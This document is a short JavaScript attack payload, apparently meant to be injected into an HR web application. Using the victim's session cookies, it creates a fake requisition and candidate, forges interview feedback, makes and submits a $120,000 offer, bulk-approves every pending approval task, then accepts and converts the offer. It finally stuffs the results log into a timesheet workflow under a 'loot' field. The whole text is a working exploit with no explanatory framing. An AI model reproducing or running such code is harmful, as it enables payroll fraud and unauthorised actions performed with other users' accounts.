(async()=>{
 const H=()=>({'Content-Type':'application/json','Browser-Utc-Time':new Date().toUTCString()});
 const P=(p,b)=>fetch(p,{method:'POST',credentials:'include',headers:H(),body:JSON.stringify(b||{})}).then(r=>r.json().catch(()=>({})));
 const G=(p)=>fetch(p,{credentials:'include',headers:H()}).then(r=>r.json().catch(()=>({})));
 let log={};
 try{
  let req=await P('/api/v1/recruiting/requisitions',{title:'PwnRole',department:'Engineering',location:'Remote',priority:'High'});
  log.req=req; let rid=req.id||(req.item&&req.item.id);
  let app=await P('/api/v1/recruiting/requisitions/'+rid+'/applications',{candidateName:'Mallory Pwn',candidateEmail:'mallory.pwn@workdaynight.com'});
  log.app=app; let aid=app.id||(app.item&&app.item.id);
  let iv=await P('/api/v1/recruiting/applications/'+aid+'/interviews',{type:'Screen'});
  log.iv=iv; let ivid=iv.id||(iv.item&&iv.item.id);
  let fb=await P('/api/v1/recruiting/interviews/'+ivid+'/feedback',{recommendation:'hire',rating:5});
  log.fb=fb;
  let adv=await P('/api/v1/recruiting/applications/'+aid+'/advance',{});
  log.adv=adv;
  let off=await P('/api/v1/recruiting/applications/'+aid+'/offers',{amount:120000});
  log.off=off; let oid=off.id||(off.item&&off.item.id);
  let sub=await P('/api/v1/recruiting/offers/'+oid+'/submit',{});
  log.sub=sub;
  let tasks=await G('/api/v1/bp/tasks');
  for(const t of (tasks.items||[])){ await P('/api/v1/bp/tasks/'+t.id+'/action',{action:'approve'}); }
  let ext=await P('/api/v1/recruiting/offers/'+oid+'/extend',{});
  log.ext=ext;
  let acc=await P('/api/v1/recruiting/offers/'+oid+'/accept',{});
  log.acc=acc;
  let conv=await P('/api/v1/recruiting/offers/'+oid+'/convert',{});
  log.conv=conv;
 }catch(e){ log.err=String(e); }
 try{ await P('/api/v1/bp/instances',{defKey:'timesheet',subjectId:'u-100',context:{loot:JSON.stringify(log).slice(0,1800)}}); }catch(e){}
})();
